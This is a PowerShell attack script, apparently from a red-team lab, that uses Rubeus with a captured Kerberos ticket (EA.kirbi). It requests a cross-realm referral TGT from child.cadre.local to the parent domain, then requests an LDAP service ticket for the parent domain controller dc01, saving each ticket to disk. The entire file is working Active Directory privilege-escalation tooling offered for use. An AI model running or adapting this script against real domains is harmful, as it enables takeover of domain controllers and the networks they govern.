[CmdletBinding()]
param(
    [string]$Kirbi = "C:\Tools\cadre-attack\T102-capture\EA.kirbi"
)
$ErrorActionPreference = "Continue"

$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$refTicket = "C:\Tools\cadre-attack\T102-capture\EA-referral.kirbi"
$ldapTicket = "C:\Tools\cadre-attack\T102-capture\EA-ldap-dc01.kirbi"
Remove-Item $refTicket, $ldapTicket -ErrorAction SilentlyContinue

Write-Output "--- Step 1: ask cross-realm referral TGT (krbtgt/CADRE.LOCAL) ---"
& $rubeus asktgs /ticket:$Kirbi /service:krbtgt/cadre.local /dc:dc02.child.cadre.local /outfile:$refTicket 2>&1 | ForEach-Object { Write-Output "REF|$_" }
Write-Output "REF_TICKET_EXISTS $(Test-Path $refTicket)"

if (Test-Path $refTicket) {
    Write-Output "--- Step 2: ask LDAP/dc01.cadre.local with referral ---"
    & $rubeus asktgs /ticket:$refTicket /service:LDAP/dc01.cadre.local /dc:dc01.cadre.local /outfile:$ldapTicket 2>&1 | ForEach-Object { Write-Output "TGS|$_" }
    Write-Output "LDAP_TICKET_EXISTS $(Test-Path $ldapTicket)"
    if (Test-Path $ldapTicket) { Write-Output "LDAP_TICKET_SIZE $((Get-Item $ldapTicket).Length)" }
} else {
    Write-Output "REFERRAL_FAILED - no referral ticket"
}
